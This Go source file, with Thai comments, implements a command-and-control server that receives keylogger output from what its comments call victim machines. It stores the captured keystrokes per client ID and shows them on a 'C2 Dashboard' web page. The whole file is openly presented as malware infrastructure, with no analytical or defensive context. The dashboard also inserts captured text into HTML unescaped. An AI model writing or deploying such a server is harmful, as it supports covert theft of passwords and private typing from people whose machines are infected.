package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"sync"
	"time"
)

// เก็บข้อมูล Keylog จำลอง
var (
	keylogData map[string][]string
	mu         sync.Mutex
)

func init() {
	keylogData = make(map[string][]string)
}

// ฟังก์ชันรับข้อมูลจาก Client
func handleStream(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("Error reading body: %v", err)
		return
	}
	defer r.Body.Close()

	// ID ของเครื่องเหยื่อ
	clientID := r.Header.Get("X-Client-ID")
	if clientID == "" {
		clientID = "unknown-" + time.Now().Format("150405")
	}

	mu.Lock()
	keylogData[clientID] = append(keylogData[clientID], string(body))
	mu.Unlock()

	fmt.Fprintf(w, "OK: Received %d bytes from %s\n", len(body), clientID)
}

// หน้า Dashboard ดูผลแบบ Realtime
func dashboard(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	html := `<html><body style="background:#111; color:#0f0; font-family:monospace;">
	<h1>C2 Dashboard</h1>
	<table border="1" width="100%">
	<tr><th>Client ID</th><th>Last Activity</th><th>Logs</th></tr>`

	for id, logs := range keylogData {
		lastLog := logs[len(logs)-1]
		if len(lastLog) > 50 { lastLog = lastLog[:50] }
		html += fmt.Sprintf("<tr><td>%s</td><td>%s</td><td>%s</td></tr>", id, time.Now().Format("15:04:05"), lastLog)
	}
	html += "</table></body></html>"
	fmt.Fprint(w, html)
}

func main() {
	http.HandleFunc("/stream", handleStream)
	http.HandleFunc("/", dashboard)
	
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}
	
	log.Printf("Starting C2 Server on :%s...", port)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}